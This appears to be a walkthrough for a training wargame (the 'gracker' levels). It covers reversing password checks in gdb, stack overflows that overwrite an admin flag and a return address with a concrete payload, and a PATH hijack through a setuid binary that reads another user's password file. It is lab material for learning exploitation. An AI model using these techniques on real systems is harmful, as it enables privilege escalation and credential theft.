## lvl1
`strings` on the backdoor

## lvl2
The password is xor'ed with `A`. After `disas main` we know that first the length is
checked, then the strings itself. Relevant lines:

```
mov    esi,0x600e40
mov    rdi,rax
call   0x4006c0 <strcmp@plt>
```

We set the breakpoint to the line where we call `strcmp`:

```
break *0x00000000004008e2
```

We then input an easy to distinguish password like `asdf`. After inspecting the relevant
registers (`esi` and `rax`) we know what is what:

```
x/s $rax -> 'asdf'
x/s $esi -> 'omitted'
```

So `$esi` holds the password. (We'd also knew that because `mov    rdi,rax` indicates that
the `read` syscall writes our input to `$rax`.) It seems that zero cool was stupid enough
to decrypt his password, instead of encrypting ours.

## lvl 3
Same as lvl2, except that now zero cool doesn't decrypt his password but encrypt ours.
So I wrote a short c prog that mimics his second version, decrypting his encrypted password
obtained by:

```
break *0x00000000004008e0
x/s $esi
```

## lvl4
Simple stack overflow: the idea is simple. The program only checks if `admin_enabled` isn't
zero, so overwriting it with anything suffices. Just input a string with enough characters
that are not zero and you're good to go. (Something like `python -c "print 'A' * 80"`.)
We can look at the stack by looking at the stack pointer:

```
x/32x $rsp
```

as well as the `admin_enabled` value:
```
x $rbp-0x4
```

So we just need to fill the buffer enough to write into `$rpb-0x4`:

Input:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## lvl5
When inspecting the `level4` binary we can see the following:

```
level4@gracker:~$ ls -lah /matrix/level4/level4
-r-sr-x--- 1 level5 level4 7.6K Jun 20  2015 /matrix/level4/level4
```

So each and every level runs as the user of the level above the current one. The hint of
`story` tells us to look at the `PATH`:

```
level4@gracker:~$ echo $PATH
/usr/sbin/:/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
```

The approach we can take is to modify any of the binaries executed to print the password
of `level5`. As we can't really create a rogue `uname` in any of the paths, we have to
modify the `$PATH` var with the correct precedence.

```
echo "cat /home/level5/.pass" > /tmp/uname
chmod a+x /tmp/uname
export PATH=/tmp:$PATH
/matrix/level4/level4
```

et voilá, done.

## lvl6
The hints give info about the ports to scan (although given in hex). Scanning the port
range gives one listener on port `2989`.

```
nmap 127.0.0.1 -p 1453-3501
```

Looking at what the program on this port has to say:

```
level5@gracker:~$ nc 127.0.0.1 2989
$ whoami
flynn
$ uname -a
SolarOs 4.0.1 Generic_50203-02 sun4m i386
Unknown.Unknown
$ login -n root
Login incorrect
login: backdoor
No home directory specified in password file!
Logging in with home=/
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
#
```

Note that the shell times out (for example when preparing a pizza …):
```
level5@gracker:~$ nc 127.0.0.1 2989
$ whoami
flynn
$ uname -a
SolarOs 4.0.1 Generic_50203-02 sun4m i386
Unknown.Unknown
$ login -n root
Login incorrect
login: backdoor
No home directory specified in password file!
Logging in with home=/
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
#
Broadcast message from ZeroCool@h4xx0r (pts/0) (Oct 21 16:29:00 2015):

You are too slow.
Mess With the Best, Die Like the Rest!
```

The output should tell you all you need to know, otherwise go watch the movie!

## lvl6
The code is given and does the following:
1. it takes input
2. `main` calls `gates_of_arjia` with our input
3. `goa` copies our input into the buffer without checking (`32` bytes per the program)
4. it then returns to `__builtin_return_address(0)`, which as per the [documentation](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html),
so the return address of the caller function, which is the next command `0x08048690 <+119>:	add    $0x10,%esp`

The goal now is to find the exact amount of input to get to `0x08048690`, the return address
in the stack.

We now set a breaking point in `gdb` *after* the `strcpy` in `goa` to examine the stack:
```
$ gdb /matrix/level6/level
(gdb) break *0x08048600
(gdb) run $(python -c "print 'A' * 36")
```

Examining the stack gives the following:
```
(gdb) x/32x $esp
0xffffdbb0:	0xffffdbc0	0xffffdded	0x0000002d	0xf7e8ce64
0xffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbe0:	0x41414141	0x00000000	0xffffdc08	0x08048690
0xffffdbf0:	0xffffdded	0xffffdcb4	0xffffdcc0	0xf7e5939d
0xffffdc00:	0xffffdc20	0xf7fce000	0x00000000	0xf7e41a63
0xffffdc10:	0x080486a0	0x00000000	0x00000000	0xf7e41a63
0xffffdc20:	0x00000002	0xffffdcb4	0xffffdcc0	0xf7feac7a
```

The return address is `11 WORDS` into the stack. So `44` fillers and the address (due to
big endian in reverse order (two-byte groupings):
```
(gdb) run $(python -c "print 'A' * 44 + '\x8b\x85\x04\x08'")
(gdb) x/32x $esp
0xffffdba0:	0xffffdbb0	0xffffdde1	0x0000002d	0xf7e8ce64
0xffffdbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbd0:	0x41414141	0x41414141	0x41414141	0x0804858b
(…)
(gdb) continue
Continuing.
Return to: 0x804858b
Welcome to Arjia City!
$
```

(Now exit and run the program with the exploit from above.)

NB:
If you'd run it with the regular address you'd quickly notice that you've got to reverse
the return address:
```
(gdb) run $(python -c "print 'A' * 44 + '\x8b\x85\x04\x08'")
(gdb) x/32x $esp
0xffffdba0:	0xffffdbb0	0xffffdde1	0x0000002d	0xf7e8ce64
0xffffdbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdbd0:	0x41414141	0x41414141	0x41414141	0x8b850408
(…)
```

Explanation from the recap:

> A summary is, that upon `call` the current EIP is pushed on the stack, and upon `ret` this value is popped from the stack and jumped to.
> With the buffer overflow you can overwrite this address on the stack and redirect code execution when the function wants to return.

## lvl7

